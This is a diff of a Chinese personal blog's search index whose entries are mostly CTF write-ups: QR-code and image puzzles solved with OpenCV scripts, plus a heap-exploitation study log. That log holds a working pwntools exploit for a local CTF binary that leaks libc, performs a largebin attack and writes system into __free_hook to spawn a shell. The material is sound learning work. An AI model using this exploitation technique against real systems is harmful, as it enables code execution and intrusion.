@@ -1,101 +1,29 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>视觉、深度学习相关论文分享</title>
-    <url>/z1nax5.github.io/2024/04/11/AI-2.0-01/</url>
-    <content><![CDATA[<p><em>φ</em>(．．)</p>
-<ol>
-<li>Attention Is All You Need|2017</li>
-<li>An image is worth 16 x 16 words:transformers for image recognition at scale|2021|ICLR</li>
-<li>Masked Autoencoders Are Scalable Vision Learners|2022|CVPR</li>
-</ol>
-<blockquote>
-<p>更新：对于第一篇paper，你可能需要清楚什么是<code>Attention</code>,<code>encoder-decoder</code>,以及一些深度学习的基础知识。这样你会更快了解什么是<code>transformer</code><br>第二篇,你可能需要清楚什么是<code>patch</code>,<code>CNN</code>,以及一些CV的基础知识，他的成果基于<code>transformer</code>,所以也请大致知道<code>transformer</code>是什么。这样你会更快了解什么是<code>VIT</code><br>第三篇，你看到了<code>VIT</code>的无限潜力，在<code>Self-Supervised Learning</code>后，对于像素这样级别很低的输出依然有惊人的表现，这得益于它的非对称<code>encoder-decoder</code>，或许图片里的信息真的太冗余了呢？  </p>
-</blockquote>
-]]></content>
-      <tags>
-        <tag>AI</tag>
-        <tag>Paper Reading</tag>
-        <tag>CV</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>2024矩阵杯wp 两级反转</title>
-    <url>/z1nax5.github.io/2024/06/19/2024%E7%9F%A9%E9%98%B5%E6%9D%AFwp-%E4%B8%A4%E7%BA%A7%E5%8F%8D%E8%BD%AC/</url>
-    <content><![CDATA[<p>｡:.ﾟヽ(*´∀&#96;)ﾉﾟ.:｡</p>
-<h2 id="两级反转"><a href="#两级反转" class="headerlink" title="两级反转"></a>两级反转</h2><p>两极反转，黑白不分<br>奇变偶不变，横变竖不变<br>(PS:或许你要非常熟悉二维码的结构  </p>
-<h3 id="write-up"><a href="#write-up" class="headerlink" title="write up"></a>write up</h3><p>光看提示大概可以猜到是奇数的横行颜色黑白反转了<br>但是有个问题是index是从0还是1开始计数呢？都很合理啊<br>而且位置探测的三个方块很明显是正确的，那就是处理图像是要跳过这些正确的部分（？</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/0.png"
-                      alt="0.png"
-                ></p>
-<p>没关系，还有一条PS：让我熟悉二维码结构</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/img.png"
-                      alt="img.png"
-                ></p>
-<p>对照一下我们的图片，初见端倪啊。</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/img_1.png"
-                      alt="img_1.png"
-                ><br>红框一列的地方黑白是固定的，奇偶的问题解决了；<br>图像处理的范围其实不能完全确定，不是整张图是肯定的，但具体一定要多少呢？其实没有足够明确的证据来佐证<br>但是没关系，二维码图形本身有很好的反混淆，我们既是没有完全复原依旧可以尝试能不能读出信息</p>
-<p>先复原红框的部分<br>拿上次的RCTF脚本略略修改一下</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">import cv2</span><br><span class="line"></span><br><span class="line">def split4db(img, offset_x=1, offset_y=1, flag=0):</span><br><span class="line">    # 跳过外围白边</span><br><span class="line">    img = img[offset_y:, offset_x:]</span><br><span class="line">    p = 0</span><br><span class="line"></span><br><span class="line">    # 先切x</span><br><span class="line">    for i in range(29):</span><br><span class="line">        p += 25</span><br><span class="line">        if i&lt;7 or i&gt;21:</span><br><span class="line">            continue</span><br><span class="line">        else:</span><br><span class="line">            if i%2==0:</span><br><span class="line">                img[p-25:p+1,:]=cv2.bitwise_not(img[p-25:p+1,:])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    return img</span><br><span class="line"></span><br><span class="line">img=cv2.imread(&quot;8E2A248B-0EE8-42b2-B19B-C6A9CE0D47F8.png&quot;)</span><br><span class="line">img=split4db(img)</span><br><span class="line">cv2.imwrite(&#x27;new0.png&#x27;, img)</span><br></pre></td></tr></table></figure></div>
-<p>结果：<br><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/new0.png"
-                      alt="new0.png"
-                ><br>扫一下，出了。</p>
-<h3 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h3><h4 id="有关为什么这个结果这么丑陋："><a href="#有关为什么这个结果这么丑陋：" class="headerlink" title="有关为什么这个结果这么丑陋："></a>有关为什么这个结果这么丑陋：</h4><p>实际上，这张二维码的图片如果拖进画图等可以数像素的软件里人力分析一下，很容易发现，它是25像素对齐的，也就是一个黑点或白点理论上是25*25像素。<br>然而，黑色并不完全遵循这个25对齐，只有当有另一个黑点和它接壤时，他才会在连接处满足25个像素对齐，否则就是24个黑色像素加上一行或一列多余的白色像素。<br>一开始我的确想要处理掉这些像素，方案为统统改为24像素对齐，但是写到一半的时候考虑到<strong>二维码有很好的反混淆性</strong>，说实话1对于24来说就是一个很小的噪声，所以就忽略不计了，把最外围的1像素白边切掉后直接处理图像就ok了。</p>
-<h4 id="有关二维码有很好的反混淆性："><a href="#有关二维码有很好的反混淆性：" class="headerlink" title="有关二维码有很好的反混淆性："></a>有关二维码有很好的反混淆性：</h4><p>这实际上是一个很有意思的知识，二维码是有自己的版本以及纠错级别的，每个二维码出生的时候就被选择了能承载多少的什么形式的信息，但是具体的就不说了，网上有非常多讲这块讲的很清楚的。<br><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/img_2.png"
-                      alt="img_2.png"
-                ><br>可以看到，如果我想要容纳更多的噪声（纠错能力变强），那么能够实际留存的有效信息越少，很符合直觉。<br><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/img_3.png"
-                      alt="img_3.png"
-                ></p>
-]]></content>
-      <tags>
-        <tag>CV</tag>
-        <tag>wp</tag>
-        <tag>Misc</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>RCTFwp sec-image</title>
+    <title>2024RCTFwp sec-image</title>
     <url>/z1nax5.github.io/2024/05/28/RCTF2024-wp-sec-image/</url>
     <content><![CDATA[<p>｡:.ﾟヽ(*´∀&#96;)ﾉﾟ.:｡</p>
 <h2 id="sec-image"><a href="#sec-image" class="headerlink" title="sec-image"></a>sec-image</h2><p>information: real sec ??</p>
 <h3 id="write-up"><a href="#write-up" class="headerlink" title="write up"></a>write up</h3><p>下了文件解包之后应该映入眼帘的是flag0.png~flag9.png这样十张图<br><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="/img.png"
+                     data-src="/z1nax5.github.io/img.png"
                      
                 ><br>来看第一张图：<br><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="/flag0.png"
+                     data-src="/z1nax5.github.io/flag0.png"
                      
                 ><br>其实我没太看出来（（，但是大伙都说肉眼可看是RCTF<br>ok，可看&#x3D;&#x3D;可打<br>很明显他是四个字母叠在一起<br>放大看看，我首先去看了字母T中间那一竖的地方：<br><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="/img_1.png"
+                     data-src="/z1nax5.github.io/img_1.png"
                      
                 ><br><strong>以普遍理性而言，一个小白格子对于一个字母应该是只有单一的信息</strong><br>所以只应该关注重复的小黑点，那些大大小小的就看作是噪声，可以看到对字母T的特征就是一种整体往左下偏移的网点阵<br>猜想别的字母也是网点阵<br>可以再看一个比较复杂的区域<br><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="/img_2.png"
+                     data-src="/z1nax5.github.io/img_2.png"
                      
                 ><br>很明显都是一些有规律的图形，每个重复的单元都可以用2*2的大小表示，就像铺地砖一样铺出来，<br>这里就基本证实我们的猜想，这张图是把不同偏移的网点图叠加在一起：<br>简单分析一下得到这张图的偏移是：</p>
 <table>
@@ -115,7 +43,7 @@
 <p>结果：<br><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="/img_3.png"
+                     data-src="/z1nax5.github.io/img_3.png"
                      
                 ></p>
 <h3 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h3><p>为了维持干净的wp,把一些思路还是放在后面<br>所以在这个答案之前，我也有过这样的想法：</p>
@@ -132,9 +60,62 @@
 <p>完结撒花<em>★,°</em>:.☆(￣▽￣)&#x2F;$:<em>.°★</em> 。<br>题的脚本不是很难构造，想到就是想到，很misc的一道题</p>
 ]]></content>
       <tags>
-        <tag>CV</tag>
         <tag>wp</tag>
         <tag>Misc</tag>
+        <tag>CV</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>2024矩阵杯wp 两级反转</title>
+    <url>/z1nax5.github.io/2024/06/19/2024%E7%9F%A9%E9%98%B5%E6%9D%AFwp-%E4%B8%A4%E7%BA%A7%E5%8F%8D%E8%BD%AC/</url>
+    <content><![CDATA[<p>｡:.ﾟヽ(*´∀&#96;)ﾉﾟ.:｡</p>
+<h2 id="两级反转"><a href="#两级反转" class="headerlink" title="两级反转"></a>两级反转</h2><p>两极反转，黑白不分<br>奇变偶不变，横变竖不变<br>(PS:或许你要非常熟悉二维码的结构  </p>
+<h3 id="write-up"><a href="#write-up" class="headerlink" title="write up"></a>write up</h3><p>光看提示大概可以猜到是奇数的横行颜色黑白反转了<br>但是有个问题是index是从0还是1开始计数呢？都很合理啊<br>而且位置探测的三个方块很明显是正确的，那就是处理图像是要跳过这些正确的部分（？</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/z1nax5.github.io/0.png"
+                      alt="0.png"
+                ></p>
+<p>没关系，还有一条PS：让我熟悉二维码结构</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/z1nax5.github.io/img.png"
+                      alt="img.png"
+                ></p>
+<p>对照一下我们的图片，初见端倪啊。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/z1nax5.github.io/img_1.png"
+                      alt="img_1.png"
+                ><br>红框一列的地方黑白是固定的，奇偶的问题解决了；<br>图像处理的范围其实不能完全确定，不是整张图是肯定的，但具体一定要多少呢？其实没有足够明确的证据来佐证<br>但是没关系，二维码图形本身有很好的反混淆，我们既是没有完全复原依旧可以尝试能不能读出信息</p>
+<p>先复原红框的部分<br>拿上次的RCTF脚本略略修改一下</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">import cv2</span><br><span class="line"></span><br><span class="line">def split4db(img, offset_x=1, offset_y=1, flag=0):</span><br><span class="line">    # 跳过外围白边</span><br><span class="line">    img = img[offset_y:, offset_x:]</span><br><span class="line">    p = 0</span><br><span class="line"></span><br><span class="line">    # 先切x</span><br><span class="line">    for i in range(29):</span><br><span class="line">        p += 25</span><br><span class="line">        if i&lt;7 or i&gt;21:</span><br><span class="line">            continue</span><br><span class="line">        else:</span><br><span class="line">            if i%2==0:</span><br><span class="line">                img[p-25:p+1,:]=cv2.bitwise_not(img[p-25:p+1,:])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    return img</span><br><span class="line"></span><br><span class="line">img=cv2.imread(&quot;8E2A248B-0EE8-42b2-B19B-C6A9CE0D47F8.png&quot;)</span><br><span class="line">img=split4db(img)</span><br><span class="line">cv2.imwrite(&#x27;new0.png&#x27;, img)</span><br></pre></td></tr></table></figure></div>
+<p>结果：<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/z1nax5.github.io/new0.png"
+                      alt="new0.png"
+                ><br>扫一下，出了。</p>
+<h3 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h3><h4 id="有关为什么这个结果这么丑陋："><a href="#有关为什么这个结果这么丑陋：" class="headerlink" title="有关为什么这个结果这么丑陋："></a>有关为什么这个结果这么丑陋：</h4><p>实际上，这张二维码的图片如果拖进画图等可以数像素的软件里人力分析一下，很容易发现，它是25像素对齐的，也就是一个黑点或白点理论上是25*25像素。<br>然而，黑色并不完全遵循这个25对齐，只有当有另一个黑点和它接壤时，他才会在连接处满足25个像素对齐，否则就是24个黑色像素加上一行或一列多余的白色像素。<br>一开始我的确想要处理掉这些像素，方案为统统改为24像素对齐，但是写到一半的时候考虑到<strong>二维码有很好的反混淆性</strong>，说实话1对于24来说就是一个很小的噪声，所以就忽略不计了，把最外围的1像素白边切掉后直接处理图像就ok了。</p>
+<h4 id="有关二维码有很好的反混淆性："><a href="#有关二维码有很好的反混淆性：" class="headerlink" title="有关二维码有很好的反混淆性："></a>有关二维码有很好的反混淆性：</h4><p>这实际上是一个很有意思的知识，二维码是有自己的版本以及纠错级别的，每个二维码出生的时候就被选择了能承载多少的什么形式的信息，但是具体的就不说了，网上有非常多讲这块讲的很清楚的。<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/z1nax5.github.io/img_2.png"
+                      alt="img_2.png"
+                ><br>可以看到，如果我想要容纳更多的噪声（纠错能力变强），那么能够实际留存的有效信息越少，很符合直觉。<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/z1nax5.github.io/img_3.png"
+                      alt="img_3.png"
+                ></p>
+]]></content>
+      <tags>
+        <tag>wp</tag>
+        <tag>Misc</tag>
+        <tag>CV</tag>
       </tags>
   </entry>
   <entry>
@@ -199,6 +180,25 @@
 ]]></content>
       <tags>
         <tag>喵喵</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>视觉、深度学习相关论文分享</title>
+    <url>/z1nax5.github.io/2024/04/11/AI-2.0-01/</url>
+    <content><![CDATA[<p><em>φ</em>(．．)</p>
+<ol>
+<li>Attention Is All You Need|2017</li>
+<li>An image is worth 16 x 16 words:transformers for image recognition at scale|2021|ICLR</li>
+<li>Masked Autoencoders Are Scalable Vision Learners|2022|CVPR</li>
+</ol>
+<blockquote>
+<p>更新：对于第一篇paper，你可能需要清楚什么是<code>Attention</code>,<code>encoder-decoder</code>,以及一些深度学习的基础知识。这样你会更快了解什么是<code>transformer</code><br>第二篇,你可能需要清楚什么是<code>patch</code>,<code>CNN</code>,以及一些CV的基础知识，他的成果基于<code>transformer</code>,所以也请大致知道<code>transformer</code>是什么。这样你会更快了解什么是<code>VIT</code><br>第三篇，你看到了<code>VIT</code>的无限潜力，在<code>Self-Supervised Learning</code>后，对于像素这样级别很低的输出依然有惊人的表现，这得益于它的非对称<code>encoder-decoder</code>，或许图片里的信息真的太冗余了呢？  </p>
+</blockquote>
+]]></content>
+      <tags>
+        <tag>CV</tag>
+        <tag>AI</tag>
+        <tag>Paper Reading</tag>
       </tags>
   </entry>
   <entry>
@@ -305,7 +305,7 @@
 <div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&quot;./vuln&quot;</span>)</span><br><span class="line">elf=ELF(<span class="string">&quot;./vuln&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./2.32-0ubuntu3.2_amd64/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index,size</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;&gt;&quot;</span>,<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;Index:&quot;</span>,<span class="built_in">str</span>(index).encode())</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;Size:&quot;</span>,<span class="built_in">str</span>(size).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;&gt;&quot;</span>,<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;Index&quot;</span>,<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;&gt;&quot;</span>,<span class="string">b&quot;3&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;Index:&quot;</span>,<span class="built_in">str</span>(index).encode())</span><br><span class="line">    p.sendafter(<span class="string">b&quot;Content:&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;&gt;&quot;</span>,<span class="string">b&quot;4&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;Index: &quot;</span>,<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x520</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x600</span>) <span class="comment">#防止合并</span></span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x510</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x600</span>) <span class="comment">#防止合并</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">b&quot;a&quot;</span>) <span class="comment">#静态编译看到show的数组要edit一次才会写入内容</span></span><br><span class="line">show(<span class="number">0</span>) <span class="comment">#libc泄露</span></span><br><span class="line"></span><br><span class="line">libc_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">0x08</span>,<span class="string">b&quot;\x00&quot;</span>))-<span class="number">0x1e3c61</span></span><br><span class="line">success(<span class="string">&quot;libc_base=&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">mp_offset= <span class="number">0x1e3280</span></span><br><span class="line">mp_ = libc_base + mp_offset</span><br><span class="line">__free_hook = libc_base+libc.sym.__free_hook</span><br><span class="line">__malloc_hook = libc_base+libc.sym.__malloc_hook</span><br><span class="line">system = libc_base+libc.sym.system</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,<span class="string">b&quot;\x00&quot;</span>) <span class="comment">#恢复fd指针</span></span><br><span class="line">add(<span class="number">15</span>,<span class="number">0x900</span>)</span><br><span class="line"></span><br><span class="line">payload = p64(__malloc_hook+<span class="number">0x10</span>+<span class="number">1168</span>)</span><br><span class="line">payload += p64(__malloc_hook+<span class="number">0x10</span>+<span class="number">1168</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(mp_+<span class="number">0x30</span>)</span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">14</span>,<span class="number">0x900</span>) <span class="comment">#large bin attack</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">0xe8</span>+p64(__free_hook)) <span class="comment">#修改__free_hook</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x600</span>)</span><br><span class="line">edit(<span class="number">1</span>,p64(system)) <span class="comment">#在__free_hook处写system</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x600</span>) <span class="comment">###准备触发</span></span><br><span class="line">edit(<span class="number">2</span>,<span class="string">b&quot;/bin/sh\x00&quot;</span>) </span><br><span class="line"></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>
 <p><em>ㅍ_ㅍ做这道题原理看了蛮久才理解，然后调试的时候nt了一下搞得我一直以为自己理解错了。。。自己给自己找麻烦（叹气</em></p>
 <h4 id="off-by-null"><a href="#off-by-null" class="headerlink" title="off-by-null"></a>off-by-null</h4><p>。</p>
-<h5 id="有关0x10对齐-64位-："><a href="#有关0x10对齐-64位-：" class="headerlink" title="有关0x10对齐(64位)："></a>有关0x10对齐(64位)：</h5><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* pad request bytes into a usable size -- internal version */</span></span><br><span class="line"><span class="comment">//MALLOC_ALIGN_MASK = 2 * SIZE_SZ -1     </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> request2size(req)                                                      \</span></span><br><span class="line"><span class="meta">    (((req) + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE)                           \</span></span><br><span class="line"><span class="meta">         ? MINSIZE                                                             \</span></span><br><span class="line"><span class="meta">         : ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK) <span class="comment">//请求大小+0x17与0x0 and运算</span></span></span><br></pre></td></tr></table></figure></div>
+<h5 id="PRVE-SIZE位共用"><a href="#PRVE-SIZE位共用" class="headerlink" title="PRVE_SIZE位共用"></a><code>PRVE_SIZE</code>位共用</h5><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* pad request bytes into a usable size -- internal version */</span></span><br><span class="line"><span class="comment">//MALLOC_ALIGN_MASK = 2 * SIZE_SZ -1     </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> request2size(req)                                                      \</span></span><br><span class="line"><span class="meta">    (((req) + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE)                           \</span></span><br><span class="line"><span class="meta">         ? MINSIZE                                                             \</span></span><br><span class="line"><span class="meta">         : ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK) <span class="comment">//请求大小+0x17与0x0 and运算</span></span></span><br></pre></td></tr></table></figure></div>
 <p>其实可以看作（请求大小+0x10）+0x07 &amp; 0x0<br>当请求大小的最后一位（16进制）小于 8 时，没有进位 （请求大小+0x10）+0x07 &amp; 0x0 &#x3D; （请求大小 &amp; 0x0 + 0x10）<br>否则 （请求大小+0x10）+ 0x07 &amp; 0x0 &#x3D; （请求大小+0x20）- 0x09 &amp; 0x0 &#x3D;（请求大小 &amp; 0x0 + 0x20）</p>
 <p>也就是说，如果你申请0x18的 chunk,malloc给你分配的将会是 0x20 的大小，去掉 0x10 的头，只剩下 0x10 的堆空间。<br>而剩下的0x08其实是和下一个chunk的<code>PRVE_SIZE</code>位共用的。<br>这里的逻辑大概是<code>PRVE_SIZE</code>仅在前一个 chunk free的状态下使用，但现在我正在往这个 chunk 里写东西，即非 free 状态，那么就可以覆盖。</p>
 <p>还是有点意思的节省空间的方式。给了我们改写<code>PRVE_SIZE</code>的机会。</p>
@@ -339,6 +339,15 @@
 <h3 id="´∀-♥"><a href="#´∀-♥" class="headerlink" title="(*´∀&#96;)~♥"></a>(*´∀&#96;)~♥</h3><p>感谢师傅晚上陪我一起看源码喵。尤其<code>check_remalloced_chunk(A, P, N)</code>的部分确实是帮大忙，看源码对我这种编程语言母语是python的人还是有点费劲的。</p>
 <p>heap初探，over!</p>
 ]]></content>
+      <tags>
+        <tag>学习日志</tag>
+        <tag>Pwn</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>unsortedbin attack &amp; largebin attack</title>
+    <url>/z1nax5.github.io/2024/06/23/really-ez-largebin/</url>
+    <content><![CDATA[]]></content>
       <tags>
         <tag>学习日志</tag>
         <tag>Pwn</tag>
@@ -388,15 +397,6 @@
       </tags>
   </entry>
   <entry>
-    <title>unsortedbin attack &amp; largebin attack</title>
-    <url>/z1nax5.github.io/2024/06/23/really-ez-largebin/</url>
-    <content><![CDATA[]]></content>
-      <tags>
-        <tag>学习日志</tag>
-        <tag>Pwn</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>四月猫饼周记</title>
     <url>/z1nax5.github.io/2024/04/20/%E5%85%B6%E5%AE%9E%E6%88%91%E6%A0%B9%E6%9C%AC%E4%B8%8D%E4%BC%9ACTF%EF%BC%8C%E6%88%91%E5%8F%AA%E4%BC%9A%E7%9E%8E%E5%87%A0%E6%8A%8A%E4%B9%B1%E6%8C%89/</url>
     <content><![CDATA[<p><em>_φ</em>_(．．)</p>
@@ -435,45 +435,90 @@
       </tags>
   </entry>
   <entry>
-    <title>火车摇啊摇</title>
-    <url>/z1nax5.github.io/2024/05/07/%E4%BA%BA%E7%94%9F%E5%B0%8F%E6%BB%A1%EF%BC%8C%E6%97%A2%E6%98%AF%E5%9C%86%E6%BB%A1/</url>
-    <content><![CDATA[<p><em>_φ</em>_(．．)</p>
-<p>收到“杭电后勤生活”的推文，明天是小满，师生驿站有活动，还配上了“人生小满，既是圆满”的文案。</p>
-<p>一时感慨，想到之前想更的博客也没更，索性一并抒发了。</p>
-<h6 id="一"><a href="#一" class="headerlink" title="一"></a>一</h6><p>最先当说的应是高中生活，本就是这句“人生小满，既是圆满”一下把我的思绪拉到了高中。</p>
-<p>差不多去年今日，准备高考时买了一本作文书里面收录了一些和我调性相符还算认可的高考作文，这里还算认可的意思大概是说写得细腻，在限时考试的背景下我仍能从里面看到些许的文字的斟酌或者追求。</p>
-<p>扯远了，这样显得我写东西多清高了，不过文人相轻是常态嘛，也该轮到我清高清高了。</p>
-<p>那时读到有一篇议论文的立意就是“人生小满，既是圆满”，也一样是从节气、自然讲到人生，佐以中华传统文化等素材一道写的饱满充实。不过可能到现在我还是就记住了“人生小满”，也可能当时那些辞藻、结构、渲染就没看进去，当时神经衰弱（现在也神经衰弱）压力挺大的，也就只能看见“人生小满”。</p>
-<h6 id="二"><a href="#二" class="headerlink" title="二"></a>二</h6><p>说到压力大，我前段时间压力就还蛮大的，忙到天天被迫熬夜还看了两次凌晨四点的杭电，不过我还是忙里偷闲会写博客，反而五一忙完了就一直在睡觉或者打打游戏，总之称不上多有营养。</p>
-<p>在忙的时候，时常想着忙完了就狠狠更新博客，把这天上地下的都点评一番，我对象挺不能理解为什么我这么喜欢写博客，还要催他去开一个。除了可以偷窥他在干什么，对我而言博客的意义是这里的确是我可以把心剖开了的地方。这里是如同群聊一样的私域链接，也不会像群聊一样提示你谁更新了，后悔了也能直接撤了文章。我清楚地知道谁可能会看，我也不介意，能知道这个地址的朋友若是有心关心我，来看看我我也挺乐意的。</p>
-<h6 id="三"><a href="#三" class="headerlink" title="三"></a>三</h6><p>原本想要写的一篇，名字就叫“火车摇啊摇”，也就是现在这篇的名字。</p>
-<p><img  
+    <title>记录一次栈迁移|Hgame2024-Elden Ring I</title>
+    <url>/z1nax5.github.io/2024/05/24/%E6%87%92%E5%BE%97%E5%96%B7/</url>
+    <content><![CDATA[<p>( ºΔº )</p>
+<p>很有意义的一次做题，尤其对我这种。。</p>
+<h3 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h3><p>按照流程应该先看一下保护和文件信息，但是因为我是知道答案找过程所以就略过。</p>
+<p>然后看ida,找一下洞<br><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="/pic/%E6%9D%AD%E5%B7%9E%E5%8D%97.png"
+                     data-src="/z1nax5.github.io/pic/eldenring1/1.png"
                       alt="img.png"
-                ></p>
-<p>许久不坐绿皮车了，但我以前坐的实在多，以至于一上车闻到那股淡淡烟草味混合着微生物腐臭味的气息时，回忆能一下冲垮了我推论的思路。下午的正赛有点难打，我们是劣势持方，从结果评委的点评来看，我们的言辞需要更精准，论证需要更多环节，要将辩题外的东西来围猎对面，也需要讲辩题外的东西为什么可以讲。对于正方，他们只要简单的讲讲自己就好。</p>
-<p>我从没有为一场辩论模辩过三次，写四五千字的稿子，甚至于失掉辩论的自信。</p>
-<p>在此之前，我一直认为，辩论是一件我擅长却不敢兴趣的事，如果生活不冲突的话，在自己擅长的地方大杀四方当然畅快，但是如果冲突了，那我当然不会忙不感兴趣的事了。</p>
-<p>不过这“最后一场辩论”，让我连是否擅长辩论都不太确信了。或许是我的前置位队友不够给力，让我每次发言都很难受；或许是来找我的学姐言辞凛然，让我总觉得自己做得不够好；或许是真的就是太难了，这个辩题在网上你都找不到一场我方持方打赢的视频…………</p>
-<p>这“最后一场辩论”里我的表现，自我感觉是不好的。我问学长，“感觉我今天打的还没新生杯的时候好”，学长说，“怎么会呢，辩论肯定是越打越好的”。</p>
-<p>火车摇啊摇，胡思乱想。</p>
-<p>绿皮车的气味真是难闻，坐了几十上百次我还是没适应。如果不是我把一周半准备三个辩题误以为一周半准备一个辩题，我应当也不会接下这场全国范围的竞技辩，也不会退掉五一回上海的车票，而买了偏远的杭州南为了确保一定能在下午前到嘉兴比赛。</p>
-<p>杭州南，好像都是绿皮车。</p>
-<p>我记得以前在嘉兴-上海的绿皮车上，我也总爱胡思乱想，过去想想没写完的作业就像现在想想没推完的论，就连不知所措和时间紧迫的焦虑也大差不差。</p>
-<h6 id="四"><a href="#四" class="headerlink" title="四"></a>四</h6><p>输了辩论，但和辩论队的纠葛很难完全了断。</p>
-<p>协会的学长其实都觉得这是没什么大不了的小事，脸皮厚一点就好了。</p>
-<p>但我是个耳根子软的人，旁人随意说两句，我很容易就在意。就像现在准备转专业一样，原本坚定了一个半学期，但是有人在我面前真诚的说上两句，加上一个我确实没考虑过的角度，我就很听劝的开始咨询转专业。</p>
-<p>这种无条件无意义的在意，除了让我费神之外，也给我加上了一层社交体面的被动。“火车摇啊摇”，其实是朋友圈的真心话版，而朋友圈，只是宣告离别辩论的社交仪式。</p>
-<h6 id="五"><a href="#五" class="headerlink" title="五"></a>五</h6><p><em>*上传的时候发现这里被我手滑空格删掉了，那就这样吧，本来这段写的也不好,弥补的事少做一点，前进的事多做一点</em></p>
-<h6 id="六"><a href="#六" class="headerlink" title="六"></a>六</h6><p>人生小满，既是圆满。</p>
-<p>有感触还是因为觉得最近也算人生小满，说人生太大了，要把眼光放的局限一点，再局限一点。</p>
-<p>我5号染了个还不错的头，小满。</p>
+                ><br>看到开了沙箱，禁用了一些系统调用<br>然后进函数看<br><img  
+                     lazyload
